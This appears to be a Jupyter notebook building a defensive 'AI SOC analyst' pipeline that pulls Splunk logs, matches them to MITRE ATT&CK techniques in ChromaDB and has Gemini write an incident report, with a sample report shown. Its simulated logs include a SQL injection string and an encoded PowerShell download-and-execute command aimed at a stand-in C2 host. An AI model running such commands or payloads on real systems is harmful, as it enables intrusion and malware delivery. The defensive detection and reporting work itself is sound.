      "Found relevant general knowledge:\n",
      "Searching vector store for potential MITRE ATT&CK mappings...\n",
      "Found potential MITRE ATT&CK mappings:\n",
      "Generating incident report with Gemini...\n",
      "\n",
      "Logged out from Splunk.\n",
      "\n",
      "--- AI SOC Analyst Assistant Completed ---\n",
      "\n",
      "--- Final Incident Report ---\n",
      "## Incident Report: Potential Brute Force SSH Login and SQL Injection Attempt Followed by Suspicious PowerShell Execution\n",
      "\n",
      "**Date/Time of Detection:** 2025-05-25T08:37:39.000+03:00 - 2025-05-25T08:38:04.000+03:00\n",
      "\n",
      "**Affected Systems/Users:**\n",
      "\n",
      "*   Host: webserver-01, endpoint-05\n",
      "*   User: root, admin\n",
      "*   IP Address: 192.168.1.10\n",
      "\n",
      "**Description of Incident:**\n",
      "\n",
      "The incident began with multiple failed SSH login attempts targeting the 'root' account on webserver-01 from IP address 192.168.1.10. Subsequently, there was another failed attempt to login as 'admin', followed by a successful SSH login to the 'admin' account from the same IP. Immediately after the successful login, a suspicious GET request was made to webserver-01: `/admin.php?id=1\\' UNION SELECT 1,2,3-- HTTP/1.1`.  This appears to be a SQL injection attempt. Finally, a potentially malicious encoded PowerShell command was executed on endpoint-05.\n",
      "\n",
      "The failed SSH attempts suggest a **T1110 - Brute Force** attack aimed at gaining initial access.  The successful login to the 'admin' account indicates a potential **T1078 - Valid Accounts** compromise, potentially stemming from password cracking or other means. The subsequent SQL injection attempt is a **T1190 - Exploit Public-Facing Application** tactic. The PowerShell execution points to a **T1059.001 - Command and Scripting Interpreter: PowerShell** tactic often used to deliver malware or perform post-exploitation activities.\n",
      "\n",
      "**Attack Vector/Technique (MITRE ATT&CK IDs and names):**\n",
      "\n",
      "*   T1110 - Brute Force\n",
      "*   T1078 - Valid Accounts\n",
      "*   T1190 - Exploit Public-Facing Application\n",
      "*   T1059.001 - Command and Scripting Interpreter: PowerShell\n",
      "\n",
      "**Impact:**\n",
      "\n",
      "Potential unauthorized access to webserver-01, possible SQL injection leading to data exfiltration or modification, and potential malware infection on endpoint-05. Possible account compromise of the 'admin' user.\n",
      "\n",
      "**Recommended Actions/Remediation:**\n",
      "\n",
      "*   **Immediate Actions:**\n",
      "    *   Isolate endpoint-05 from the network immediately to prevent potential malware spread (based on malware playbook).\n",
      "    *   Investigate the PowerShell script execution on endpoint-05 to determine its purpose and impact.\n",
      "    *   Block IP address 192.168.1.10 at the firewall to prevent further attacks.\n",
      "    *   Disable the 'admin' account on webserver-01 temporarily to prevent further unauthorized access, while conducting a thorough audit.\n",
      "    *   Analyze webserver-01 logs for further malicious activity following the successful SSH login.\n",
      "    *   Review web server's access logs for other potential SQL injection attempts.\n",
      "\n",
      "*   **Long-Term Actions:**\n",
      "    *   Implement multi-factor authentication (MFA) for all user accounts, especially those with administrative privileges. (based on past_incident (unauthorized_access))\n",
      "    *   Enforce stronger password policies. (based on past_incident (unauthorized_access))\n",
      "    *   Conduct vulnerability scanning and penetration testing on the web application to identify and remediate SQL injection vulnerabilities.\n",
      "    *   Implement robust input validation and output encoding to prevent SQL injection attacks.\n",
      "    *   Investigate how the 'admin' user's credentials were compromised.\n",
      "    *   Implement endpoint detection and response (EDR) solution for endpoint-05 (if not already implemented) to detect and prevent future malicious activity.\n",
      "    *   Update security definitions on all systems.\n",
      "\n",
      "**Status:** New Incident\n",
      "\n",
      "**Analyst Notes:**\n",
      "\n",
      "The successful SSH login followed by the SQL injection attempt is concerning and suggests a targeted attack. The encoded PowerShell execution is highly suspicious and needs immediate attention. Determine the origin of IP address 192.168.1.10. Further investigation is required to determine the full extent of the compromise and the attacker's objectives. Consider performing a memory dump and process listing on endpoint-05 before isolation.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import time # Added for time.sleep\n",
    "import json # Added for JSON handling if needed, though not directly used in the current version of the STIX loading\n",
    "from dotenv import load_dotenv\n",
    "\n",
    "# Splunk SDK imports\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "\n",
    "# ChromaDB import\n",
    "import chromadb\n",
    "\n",
    "# Google Gemini imports\n",
    "import google.generativeai as genai\n",
    "\n",
    "# STIX2 imports for MITRE ATT&CK parsing\n",
    "from stix2 import MemoryStore, Filter, AttackPattern, Relationship\n",
    "\n",
    "# Load environment variables from app.env file\n",
    "load_dotenv(\"app.env\")\n",
    "\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8089))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\") # IMPORTANT: Update this in app.env\n",
    "SPLUNK_TOKEN = os.environ.get(\"SPLUNK_TOKEN\") # Optional, not used in current connect_to_splunk\n",
    "\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set. Get your key from Google AI Studio (https://makersuite.google.com/).\")\n",
    "\n",
    "# Configure Google Gemini\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "llm = genai.GenerativeModel('gemini-2.0-flash') # For text generation\n",
    "embedding_model = 'embedding-001' # For embeddings\n",
    "\n",
    "# ChromaDB Settings\n",
    "CHROMA_DB_PATH = \"./chroma_db\"\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)\n",
    "\n",
    "# MITRE ATT&CK Data File Path\n",
    "MITRE_STIX_JSON_PATH = \"enterprise-attack.json\" # Ensure this file is in the same directory as this script\n",
    "\n",
    "# --- Splunk Connection & Query Functions ---\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
    "    connection_url = f\"https://{SPLUNK_HOST}:{SPLUNK_PORT}\"\n",
    "    print(f\"Attempting to connect to Splunk at {connection_url}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=SPLUNK_HOST,\n",
    "            port=SPLUNK_PORT,\n",
    "            username=SPLUNK_USERNAME,\n",
    "            password=SPLUNK_PASSWORD,\n",
    "            scheme=\"https\", # Changed from http - Crucial for 8089\n",
    "            verify=False # IMPORTANT: For testing with self-signed certs. Use True with a proper CA bundle in production!\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    \"\"\"\n",
    "    Runs a Splunk search query and returns the results.\n",
    "    \"\"\"\n",
    "    print(f\"Attempting to run Splunk query:\\n```\\n{query}\\n```\")\n",
    "    try:\n",
    "        kwargs = {\n",
    "            \"earliest_time\": earliest_time,\n",
    "            \"latest_time\": latest_time,\n",
    "            \"output_mode\": output_mode,\n",
    "            \"app\": \"search\"\n",
    "        }\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "\n",
    "        print(f\"Splunk Job ID: {job.sid}\")\n",
    "        # Wait for the job to complete\n",
    "        while not job.is_ready():\n",
    "            time.sleep(0.1)\n",
    "            # Print the current dispatch state of the job for more detailed debugging\n",
    "            print(f\"Job {job.sid} status: {job.content.get('dispatchState')}\") \n",
    "\n",
    "        # After job is ready, check if it's done or if there are messages\n",
    "        if job.is_done():\n",
    "            print(f\"Splunk search job {job.sid} is DONE. Final dispatch state: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Check for messages even if done (warnings, etc.)\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel() # Clean up the search job to free resources on Splunk\n",
    "            print(f\"Successfully retrieved {len(events)} events from Splunk for Job ID {job.sid}.\")\n",
    "            return events\n",
    "        else: # This block handles cases where the job might not complete successfully\n",
    "            print(f\"Splunk search job {job.sid} did not complete successfully. Final status: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Print any error/warning messages\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "    \n",
    "# --- Embedding & ChromaDB Functions ---\n",
    "def get_embedding(text):\n",
    "    \"\"\"Generates an embedding for the given text using the specified Gemini embedding model.\"\"\"\n",
    "    try:\n",
    "        # Use RETRIEVAL_DOCUMENT for texts meant to be retrieved (like knowledge base entries)\n",
    "        response = genai.embed_content(model=embedding_model, content=text, task_type=\"RETRIEVAL_DOCUMENT\")\n",
    "        return response['embedding']\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating embedding for text (first 50 chars): '{text[:50]}...': {e}\")\n",
    "        return None\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH):\n",
    "    \"\"\"Loads MITRE ATT&CK techniques from a STIX 2.x JSON file.\"\"\"\n",
    "    print(f\"Loading MITRE ATT&CK data from {stix_json_path} using stix2...\")\n",
    "    try:\n",
    "        stix_store = MemoryStore()\n",
    "        stix_store.load_from_file(stix_json_path)\n",
    "        \n",
    "        attack_data_points = []\n",
    "        # Query for all Attack Pattern objects\n",
    "        techniques = stix_store.query(Filter(\"type\", \"=\", \"attack-pattern\"))\n",
    "\n",
    "        for tech in techniques:\n",
    "            # Extract MITRE ID (e.g., T1000) from external_references\n",
    "            mitre_id = None\n",
    "            for ext_ref in tech.external_references:\n",
    "                if ext_ref.get('source_name') == 'mitre-attack' and 'external_id' in ext_ref:\n",
    "                    if ext_ref['external_id'].startswith('T'):\n",
    "                        mitre_id = ext_ref['external_id']\n",
    "                        break\n",
    "            if not mitre_id:\n",
    "                # print(f\"Warning: Skipping technique with no valid MITRE ID: {tech.name}\")\n",
    "                continue # Skip techniques without a T-number ID\n",
    "\n",
    "            description = tech.description if hasattr(tech, 'description') else \"No description available.\"\n",
    "            \n",
    "            # Extract Tactics using x_mitre_tactic_refs (STIX2 standard way)\n",
    "            tactics_names = []\n",
    "            if hasattr(tech, 'x_mitre_tactic_refs'):\n",
    "                for tactic_ref_id in tech.x_mitre_tactic_refs:\n",
    "                    tactic_sdo = stix_store.get(tactic_ref_id)\n",
    "                    if tactic_sdo and tactic_sdo.type == 'tactic':\n",
    "                        tactics_names.append(tactic_sdo.name)\n",
    "            tactics_str = ', '.join(tactics_names) if tactics_names else 'N/A'\n",
    "            \n",
    "            # Construct full text for embedding\n",
    "            full_text = (\n",
    "                f\"MITRE ATT&CK Technique: {tech.name} (ID: {mitre_id})\\n\"\n",
    "                f\"Tactics: {tactics_str}\\n\"\n",
    "                f\"Description: {description}\\n\"\n",
    "                f\"URL: {tech.external_references[0]['url'] if tech.external_references else 'N/A'}\"\n",
    "            )\n",
    "            \n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id,\n",
    "                \"text\": full_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_str,\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        return attack_data_points\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at '{stix_json_path}'\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/ and place it in the script's directory.\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    \"\"\"Populates the ChromaDB collection with security knowledge data points, avoiding duplicates.\"\"\"\n",
    "    print(f\"Attempting to add {len(data_points)} documents to the knowledge base.\")\n",
    "    \n",
    "    # Get existing IDs to prevent adding duplicates\n",
    "    existing_ids_result = security_collection.get(include=[])\n",
    "    existing_ids = set(existing_ids_result.get('ids', []))\n",
    "\n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "\n",
    "    for dp in data_points:\n",
    "        unique_id = dp.get(\"id\")\n",
    "        if not unique_id:\n",
    "            # Generate a unique ID if not provided (e.g., for custom knowledge)\n",
    "            unique_id = f\"custom_knowledge_{hash(dp['text'])}\"\n",
    "\n",
    "        if unique_id in existing_ids:\n",
    "            # print(f\"Skipping existing document with ID: {unique_id}\") # Uncomment for verbose debugging\n",
    "            continue\n",
    "\n",
    "        embedding = get_embedding(dp[\"text\"])\n",
    "        if embedding is not None: # Ensure embedding was successfully generated\n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp.get(\"metadata\", {}))\n",
    "            ids_to_add.append(unique_id)\n",
    "        else:\n",
    "            print(f\"Skipping document due to embedding failure: {dp['text'][:50]}...\")\n",
    "\n",
    "    if docs_to_add:\n",
    "        try:\n",
    "            security_collection.add(\n",
    "                documents=docs_to_add,\n",
    "                embeddings=embeddings_to_add,\n",
    "                metadatas=metadatas_to_add,\n",
    "                ids=ids_to_add\n",
    "            )\n",
    "            print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Error adding documents to ChromaDB: {e}\")\n",
    "    else:\n",
    "        print(\"No new unique documents to add to the vector store.\")\n",
    "\n",
    "def search_security_knowledge_base(query_text, n_results=5, filter_metadata=None):\n",
    "    \"\"\"\n",
    "    Searches the ChromaDB knowledge base for relevant documents.\n",
    "    Args:\n",
    "        query_text (str): The text to search for.\n",
    "        n_results (int): Number of results to return.\n",
    "        filter_metadata (dict, optional): A dictionary to filter results by metadata.\n",
    "                                          E.g., {\"type\": \"mitre_attack_technique\"}.\n",
    "    Returns:\n",
    "        dict: ChromaDB query results (documents, distances, metadatas).\n",
    "    \"\"\"\n",
    "    query_embedding = get_embedding(query_text)\n",
    "    if query_embedding is not None:\n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=n_results,\n",
    "            include=['documents', 'distances', 'metadatas'],\n",
    "            where=filter_metadata # Apply metadata filtering if provided\n",
    "        )\n",
    "        return results\n",
    "    return None\n",
    "\n",
    "# --- AI Report Generation Function ---\n",
    "def generate_incident_report(splunk_logs, relevant_knowledge, mitre_mappings, incident_summary=\"\"):\n",
    "    \"\"\"\n",
    "    Generates a comprehensive security incident report using Gemini.\n",
    "    \"\"\"\n",
    "    # Format MITRE details for the prompt\n",
    "    mitre_details_str = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitre_details_str = \"\\n**Potential MITRE ATT&CK Mappings:**\\n\"\n",
    "        for mapping in mitre_mappings:\n",
    "            mitre_details_str += f\"* **Technique:** {mapping.get('technique_name', 'N/A')} ({mapping.get('technique_id', 'N/A')})\\n\"\n",
    "            if mapping.get('tactics') and mapping['tactics'] != 'N/A':\n",
    "                mitre_details_str += f\"  **Tactics:** {mapping['tactics']}\\n\"\n",
    "            # Ensure description is a string and handle potential truncation\n",
    "            description_text = str(mapping.get('description', 'No description.')).strip()\n",
    "            mitre_details_str += f\"  **Description:** {description_text[:200]}...\\n\"\n",
    "            mitre_details_str += f\"  **Confidence (similarity score):** {mapping.get('distance_score', 0.0):.4f}\\n\"\n",
    "\n",
    "    # Main prompt for Gemini\n",
    "    prompt = f\"\"\"\n",
    "You are an AI-driven SOC analyst assistant. Your task is to generate a concise and informative incident report based on the provided Splunk logs, relevant security knowledge, and potential MITRE ATT&CK mappings.\n",
    "\n",
    "---\n",
    "**Splunk Logs (Raw Data for Context):**\n",
    "{splunk_logs}\n",
    "\n",
    "---\n",
    "**Relevant Security Knowledge (from Vector Store - e.g., playbooks, past incidents):**\n",
    "{relevant_knowledge if relevant_knowledge else \"No specific relevant security knowledge found.\"}\n",
    "\n",
    "---\n",
    "**Potential MITRE ATT&CK Mappings (Most Relevant First):**\n",
    "{mitre_details_str if mitre_details_str else \"No specific MITRE ATT&CK mappings found or provided. Analyze logs for common adversary behaviors.\"}\n",
    "\n",
    "---\n",
    "**Incident Summary (if provided by human analyst):**\n",
    "{incident_summary if incident_summary else \"No specific summary provided, analyze logs for key details.\"}\n",
    "\n",
    "---\n",
    "**Instructions for Report Generation:**\n",
    "1.  **Incident Title:** Create a clear and descriptive title for the incident.\n",
    "2.  **Date/Time of Detection:** Extract the earliest and latest timestamps from the logs. Provide a range if multiple times.\n",
    "3.  **Affected Systems/Users:** Identify specific hosts, IP addresses, or users mentioned in the logs.\n",
    "4.  **Description of Incident:** Summarize the observed events chronologically. **Crucially, explain how the observed behavior aligns with the most relevant MITRE ATT&CK Tactics and Techniques, referencing their IDs and names from the provided mappings.**\n",
    "5.  **Attack Vector/Technique (MITRE ATT&CK IDs and names):** Explicitly list the *most relevant* MITRE ATT&CK Tactics and Techniques identified (e.g., \"T1078 - Valid Accounts, T1110 - Brute Force\").\n",
    "6.  **Impact:** Briefly describe the potential impact of this incident (e.g., data breach, service disruption, account compromise, unauthorized access).\n",
    "7.  **Recommended Actions/Remediation:** Based on relevant knowledge (playbooks) and log analysis, suggest immediate and long-term actions for containment, eradication, and recovery.\n",
    "8.  **Status:** (e.g., New Incident, In Progress, Contained, Resolved) - Default to \"New Incident\" if unsure.\n",
    "9.  **Analyst Notes:** Any other observations, open questions, or next steps for further investigation.\n",
    "\n",
    "Please present the report in a clear, markdown-formatted structure, focusing on actionable intelligence.\n",
    "\"\"\"\n",
    "    try:\n",
    "        response = llm.generate_content(prompt)\n",
    "        return response.text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating incident report with Gemini: {e}\")\n",
    "        return \"Failed to generate incident report.\"\n",
    "\n",
    "# --- Main Orchestration Logic ---\n",
    "def ai_soc_analyst_assistant(splunk_query, incident_summary=\"\", distance_threshold=0.3):\n",
    "    \"\"\"\n",
    "    Orchestrates the AI SOC Analyst workflow: Splunk query, knowledge retrieval, and report generation.\n",
    "    \"\"\"\n",
    "    print(f\"--- Starting AI SOC Analyst Assistant for query ---\")\n",
    "    print(f\"DEBUG: Splunk query string:\\n```\\n{splunk_query}\\n```\")\n",
    "\n",
    "    # 1. Connect to Splunk\n",
    "    splunk_service = connect_to_splunk()\n",
    "    if not splunk_service:\n",
    "        print(\"Failed to connect to Splunk. Cannot proceed.\")\n",
    "        return \"Failed to connect to Splunk. Cannot proceed.\"\n",
    "\n",
    "    # 2. Retrieve logs from Splunk\n",
    "    print(\"Retrieving data from Splunk...\")\n",
    "    raw_splunk_events = run_splunk_query(splunk_service, splunk_query, earliest_time=\"-24h\", latest_time=\"now\")\n",
    "    \n",
    "    if not raw_splunk_events:\n",
    "        print(\"No relevant Splunk logs found for the given query.\")\n",
    "        splunk_service.logout()\n",
    "        return \"No relevant Splunk logs found to generate a report.\"\n",
    "    \n",
    "    # Format Splunk logs for the LLM\n",
    "    formatted_splunk_logs = \"\\n\".join([str(event) for event in raw_splunk_events])\n",
    "    \n",
    "    # 3. Search vector store for relevant general security knowledge (e.g., playbooks)\n",
    "    print(\"Searching vector store for relevant general security knowledge...\")\n",
    "    general_knowledge_query = f\"Based on these security logs, what are relevant security playbooks, past incidents, or policies? Logs: {formatted_splunk_logs}\"\n",
    "    general_knowledge_results = search_security_knowledge_base(\n",
    "        general_knowledge_query,\n",
    "        n_results=3, # Get top 3 general knowledge results\n",
    "        filter_metadata={\"type\": {\"$ne\": \"mitre_attack_technique\"}} # Exclude MITRE techniques here\n",
    "    )\n",
    "    relevant_knowledge_str = \"\"\n",
    "    if general_knowledge_results and general_knowledge_results['documents'] and general_knowledge_results['documents'][0]:\n",
    "        print(\"Found relevant general knowledge:\")\n",
    "        for i, doc in enumerate(general_knowledge_results['documents'][0]):\n",
    "            relevant_knowledge_str += f\"* **Source:** {general_knowledge_results['metadatas'][0][i].get('type', 'N/A')} ({general_knowledge_results['metadatas'][0][i].get('incident_type', '')})\\n\"\n",
    "            relevant_knowledge_str += f\"    **Content:** {doc}\\n\\n\"\n",
    "    else:\n",
    "        print(\"No specific relevant general knowledge found in vector store.\")\n",
    "\n",
    "    # 4. Search vector store for potential MITRE ATT&CK mappings\n",
    "    print(\"Searching vector store for potential MITRE ATT&CK mappings...\")\n",
    "    mitre_mapping_query = f\"Analyze the following security events and identify potential MITRE ATT&CK tactics and techniques: {formatted_splunk_logs}\"\n",
    "    mitre_mapping_results = search_security_knowledge_base(\n",
    "        mitre_mapping_query,\n",
    "        n_results=10, # Get top 10 potential MITRE techniques\n",
    "        filter_metadata={\"type\": \"mitre_attack_technique\"} # Only include MITRE techniques\n",
    "    )\n",
    "    \n",
    "    identified_mitre_mappings = []\n",
    "    if mitre_mapping_results and mitre_mapping_results['documents'] and mitre_mapping_results['documents'][0]:\n",
    "        print(\"Found potential MITRE ATT&CK mappings:\")\n",
    "        for i, doc_content in enumerate(mitre_mapping_results['documents'][0]):\n",
    "            metadata = mitre_mapping_results['metadatas'][0][i]\n",
    "            distance = mitre_mapping_results['distances'][0][i]\n",
    "            \n",
    "            # Only consider mappings within a certain similarity threshold\n",
    "            if distance < distance_threshold: # A lower distance means higher similarity\n",
    "                identified_mitre_mappings.append({\n",
    "                    \"technique_name\": metadata.get('technique_name'),\n",
    "                    \"technique_id\": metadata.get('technique_id'),\n",
    "                    \"tactics\": metadata.get('tactics'),\n",
    "                    \"description\": doc_content,\n",
    "                    \"distance_score\": distance\n",
    "                })\n",
    "        \n",
    "        # Sort by distance score (lower is better/more relevant) and take top 5\n",
    "        identified_mitre_mappings.sort(key=lambda x: x['distance_score'])\n",
    "        identified_mitre_mappings = identified_mitre_mappings[:5] # Limit to top 5 for report\n",
    "        \n",
    "        for mapping in identified_mitre_mappings:\n",
    "            print(f\"  - {mapping['technique_id']}: {mapping['technique_name']} (Score: {mapping['distance_score']:.4f})\")\n",
    "    else:\n",
    "        print(\"No relevant MITRE ATT&CK techniques found within the threshold.\")\n",
    "\n",
    "    # 5. Generate Incident Report using LLM\n",
    "    print(\"Generating incident report with Gemini...\")\n",
    "    incident_report = generate_incident_report(\n",
    "        formatted_splunk_logs,\n",
    "        relevant_knowledge_str,\n",
    "        identified_mitre_mappings,\n",
    "        incident_summary\n",
    "    )\n",
    "    \n",
    "    # 6. Log out from Splunk\n",
    "    try:\n",
    "        splunk_service.logout()\n",
    "        print(\"\\nLogged out from Splunk.\")\n",
    "    except Exception as e:\n",
    "        print(f\"Error during Splunk logout: {e}\")\n",
    "\n",
    "    print(\"\\n--- AI SOC Analyst Assistant Completed ---\")\n",
    "    return incident_report\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Starting AI SOC Analyst Assistant (Full Architecture) ---\")\n",
    "\n",
    "    # --- Step 0: Ensure Security Knowledge Base is Populated ---\n",
    "    print(\"\\n--- Checking/Populating Security Knowledge Base ---\")\n",
    "    total_docs_in_db = security_collection.count()\n",
    "    \n",
    "    needs_mitre_population = False\n",
    "    if total_docs_in_db == 0:\n",
    "        needs_mitre_population = True\n",
    "        print(\"ChromaDB collection is currently empty. MITRE ATT&CK data and sample knowledge need to be populated.\")\n",
    "    else:\n",
    "        try:\n",
    "            # Check if MITRE ATT&CK techniques are present\n",
    "            mitre_techniques_in_db = security_collection.get(where={\"type\": \"mitre_attack_technique\"}, include=[])\n",
    "            if len(mitre_techniques_in_db['ids']) == 0:\n",
    "                needs_mitre_population = True\n",
    "                print(\"MITRE ATT&CK data not present in knowledge base. Populating now...\")\n",
    "            else:\n",
    "                print(f\"MITRE ATT&CK data already present in knowledge base ({len(mitre_techniques_in_db['ids'])} techniques found).\")\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Error checking for existing MITRE data: {e}. Assuming MITRE data needs population.\")\n",
    "            needs_mitre_population = True\n",
    "\n",
    "    if needs_mitre_population:\n",
    "        mitre_data_points = load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH)\n",
    "        if mitre_data_points:\n",
    "            populate_security_knowledge_base(mitre_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. AI mapping might be less effective.\")\n",
    "    \n",
    "    # Add sample general security knowledge (playbooks, past incidents) if not already present\n",
    "    sample_data_ids = [\"playbook_phishing_response\", \"playbook_malware_containment\", \"inc_003_unauth_db_access\"]\n",
    "    sample_data_present = False\n",
    "    try:\n",
    "        # Check if at least one of the sample data IDs exists\n",
    "        if security_collection.get(ids=[sample_data_ids[0]], include=[])['ids']:\n",
    "            sample_data_present = True\n",
    "    except Exception as e:\n",
    "        print(f\"Warning: Error checking for sample data: {e}. Will attempt to add.\")\n",
    "        sample_data_present = False\n",
    "\n",
    "    if not sample_data_present:\n",
    "        print(\"Sample security knowledge not fully present. Populating now...\")\n",
    "        sample_security_knowledge = [\n",
    "            {\"id\": \"playbook_phishing_response\", \"text\": \"Playbook: Phishing Incident Response. Trigger: User reports suspicious email or email gateway alert. Steps: 1. Verify email authenticity (headers, sender reputation). 2. Check for malicious attachments/links (sandbox). 3. If malicious, remove email from all affected inboxes. 4. Reset user password if credentials compromised. 5. Educate user. 6. Block malicious sender/domains at firewall/proxy. 7. Log and document. Severity: Medium to High depending on compromise.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"phishing\"}},\n",
    "            {\"id\": \"playbook_malware_containment\", \"text\": \"Playbook: Malware Containment and Eradication. Trigger: EDR alert, antivirus detection, or user report of suspicious activity. Steps: 1. Isolate infected host(s) from network immediately. 2. Collect forensic data (memory dump, process list). 3. Run full endpoint scan. 4. Identify persistence mechanisms (registry, scheduled tasks, services). 5. Remove malware and persistence. 6. Restore affected files from clean backup. 7. Update security definitions. Severity: High.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"malware\"}},\n",
    "            {\"id\": \"inc_003_unauth_db_access\", \"text\": \"Past Incident: Incident ID INC-2024-003. Type: Unauthorized Access - Database. Date: 2024-05-10. Affected: Customer Database (MySQL). Attack Vector: Brute force via SSH followed by database privilege escalation. Description: Numerous failed SSH logins from external IP, then successful login to 'admin' account, followed by `SELECT * FROM users;` queries. Containment: Blocked source IP at firewall, disabled compromised admin account, rotated DB credentials. Impact: Potential exfiltration of customer PII. Lessons Learned: Implement MFA for all admin accounts, stronger password policies. MITRE ATT&CK T1078 (Valid Accounts), T1110 (Brute Force).\", \"metadata\": {\"type\": \"past_incident\", \"incident_type\": \"unauthorized_access\", \"mitre_id\": \"T1078, T1110\"}},\n",
    "        ]\n",
    "        populate_security_knowledge_base(sample_security_knowledge)\n",
    "    else:\n",
    "        print(\"Sample security knowledge appears to be present. Skipping population.\")\n",
    "\n",
    "    print(f\"\\nTotal unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "    # --- Run a combined simulated scenario ---\n",
    "    # This Splunk query generates mock logs that hint at various security events.\n",
    "    splunk_simulated_logs = \"\"\"| makeresults count=6\n",
    "| streamstats count as rn\n",
    "| eval _time = case(\n",
    "    rn=1, relative_time(now(), \"-30s\"),\n",
    "    rn=2, relative_time(now(), \"-25s\"),\n",
    "    rn=3, relative_time(now(), \"-20s\"),\n",
    "    rn=4, relative_time(now(), \"-15s\"),\n",
    "    rn=5, relative_time(now(), \"-10s\"),\n",
    "    rn=6, relative_time(now(), \"-5s\")\n",
    "  )\n",
    "| eval host = case(\n",
    "    rn <= 5, \"webserver-01\",\n",
    "    rn=6, \"endpoint-05\"\n",
    "  )\n",
    "| eval source = case(\n",
    "    rn <= 4, \"/var/log/auth.log\",\n",
    "    rn=5, \"/var/log/apache2/access.log\",\n",
    "    rn=6, \"PowerShell Operational Log\"\n",
    "  )\n",
    "| eval _raw = case(\n",
    "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\\\" 404 200 \\\\\"-\\\\\" \\\\\"Mozilla/5.0\\\\\"\",\n",
    "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vbWFpbi9wYWF5bG9hZC5wc2AwIgApKQAKAA==\"\n",
    "  )\n",
    "| table _time, host, source, _raw\n",
    "| sort _time\"\"\"\n",
    "\n",
    "    print(\"\\n\\n=== Running Combined Simulated Scenario (with MITRE Mapping) ===\")\n",
    "    incident_report = ai_soc_analyst_assistant(\n",
    "        splunk_simulated_logs,\n",
